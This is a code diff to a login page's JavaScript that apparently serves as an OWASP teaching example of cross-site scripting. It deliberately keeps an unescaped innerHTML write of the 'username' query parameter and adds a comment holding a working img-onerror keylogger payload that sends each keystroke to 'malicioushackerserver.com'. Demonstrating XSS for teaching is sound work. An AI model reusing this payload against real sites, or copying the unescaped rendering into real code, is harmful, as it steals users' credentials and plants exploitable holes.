@@ -14,9 +14,25 @@ function renderError(){
     var username = urlParams.get('username');
     if (username != null && username.length > 0) {
         var errorDiv = document.getElementById("error");
-        errorDiv.innerHTML = "Incorrect login for user: " + username; // eg. <img src=x onerror="alert(1)">
 
-        //<img src=asdf style="visibility: hidden;" onerror="f=function(e){fetch((`http://localhost:8000/${String.fromCharCode(e.charCode)}`), {mode: 'no-cors'});};document.getElementById('username').onkeypress=f;document.getElementById('password').onkeypress=f; document.getElementById('error').style.display = 'none';">
+        // OWASP Top 10 2017 #7: Cross-Site Scripting (XSS)
+        // We take untrusted content from our query string parameters and render
+        // HTML using it, meaning the attacker can run arbitrary Javascript in a
+        // user's browser. For example, a phishing email may contain the 
+        // following value (URL encoded) for "username"; if the user clicks on a
+        // link with this paramater, a keylogger sends keystrokes in the 
+        // password field to 'malicioushackerserver.com'.
+        //
+        //<img%20src=asdf%20style="visibility:%20hidden;"%20onerror="f=function(e){fetch((`http://malicioushackerserver.com:8000/${String.fromCharCode(e.charCode)}`),%20{mode:%20%27no-cors%27});};document.getElementById(%27username%27).onkeypress=f;document.getElementById(%27password%27).onkeypress=f;%20document.getElementById(%27error%27).style.display%20=%20%27none%27;">
+        //
+        // To prevent this, we should escape our content before rendering it; we
+        // can do this manually, or use a front-end framework that will escape
+        // XSS content for us. 
+
+
+        errorDiv.innerHTML = "Incorrect login for user: " + username;
+
+        
     }
 }
 renderError();
